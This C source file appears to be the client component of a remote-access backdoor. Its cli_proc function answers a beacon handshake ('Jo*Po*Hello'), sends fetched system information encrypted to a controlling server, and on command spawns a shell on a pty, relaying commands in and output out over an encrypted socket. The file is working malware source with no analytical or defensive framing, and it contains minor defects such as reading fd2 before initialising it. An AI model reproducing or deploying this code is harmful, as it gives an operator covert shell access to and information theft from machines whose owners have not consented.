#include "unp.h"
#include "common.h"
#include "cmfc.h"

#define TBUFFSIZE 512

void cli_proc(const int *sockfd)
{
    int maxfdp1;
    fd_set rset;
    MSGINFO_S msgi;
    int online = -1;

    int fd1[2], fd2[2];
    int shact = 0;
    int nread;
    char buf[TBUFFSIZE];
    COMMOND_S cmds;
    int ptyid = -1;

    FD_ZERO(&rset);
    for ( ; ; )
    {
        bzero(&msgi, sizeof(MSGINFO_S));
        bzero(&cmds, sizeof(COMMOND_S));
        bzero(buf, TBUFFSIZE);

        FD_SET(*sockfd, &rset);
        maxfdp1 = *sockfd + 1;
        if (shact)
        {
            FD_SET(fd2[0], &rset);
            maxfdp1 = max(*sockfd, fd2[0]) + 1;
        }
        Select(maxfdp1, &rset, NULL, NULL, NULL);

        if (FD_ISSET(*sockfd, &rset))
        {
            if (Readn(*sockfd, &msgi, sizeof(MSGINFO_S)) <= 0)
            {
                err_msg("cli_proc: server terminated prematurely!");
                break;
            }

            char *beacon = "Jo*Po*Hello";
            if ((CMD_SHAKEHAND == msgi.msg_id) && (0 == strcmp(beacon, (char *)msgi.context)))
            {
                bzero(&msgi, sizeof(MSGINFO_S));
                int res = fetch_sysinfo(&msgi);
                msgi.msg_id = CMD_SYSINFO;
                if (res)
                {
                    encrypt_buf((char *)&msgi, sizeof(MSGINFO_S));
                    Writen(*sockfd, &msgi, sizeof(MSGINFO_S));
                    online = 0;
                }
            }
            if (online == 0)
            {
                decrypt_buf((char *)&msgi, sizeof(MSGINFO_S));
                // printf("0x%02x\n", msgi.msg_id);

                if (CMD_TELNET == msgi.msg_id)
                {
                    if (pipe(fd1) < 0 || pipe(fd2) < 0) {
                        err_msg("pipe error");
                        continue;
                    }

                    ptyid = startshell(fd1, fd2);
                    shact = 1;
                }
                if (CMD_COMMOND == msgi.msg_id)
                {
                    COMMOND_S *cmd = (COMMOND_S *)&msgi.context;
                    if (writen(fd1[1], cmd->command, strlen(cmd->command)) != strlen(cmd->command)) {
                        err_msg("writen error to master pty");
                        continue;
                    }
                        
                    if (0 == strncmp("exit", (char *)cmd->command, 4))
                    {
                        shact = 0;
                        if (waitpid(ptyid, NULL, 0) != ptyid)
                            err_msg("wait error");
                    }
                }
            }
            else
            {
                break;
            }
            
        }

        if (FD_ISSET(fd2[0], &rset))
        {
            if ((nread = read(fd2[0], buf, TBUFFSIZE)) <= 0) {
                err_msg("read error from stdin");
                continue;
            }
                
            // buf[nread + 1] = 0;
            msgi.msg_id = CMD_TELNET;
            cmds.flag = 0;

            // memcpy((char *)&cmds.command, (char *)&buf, nread);
            char *ibuf = buf;
            char *obuf = cmds.command;
            size_t ilen = TBUFFSIZE;
            size_t olen = TBUFFSIZE;
            iconv_t iv = iconv_open("UTF-16", "UTF-8");
            iconv(iv, &ibuf, &ilen, &obuf, &olen);

            memcpy((char *)&msgi.context, (char *)&cmds, sizeof(COMMOND_S));
            encrypt_buf((char *)&msgi, sizeof(MSGINFO_S));
            Writen(*sockfd, &msgi, sizeof(MSGINFO_S));
        }
    }
}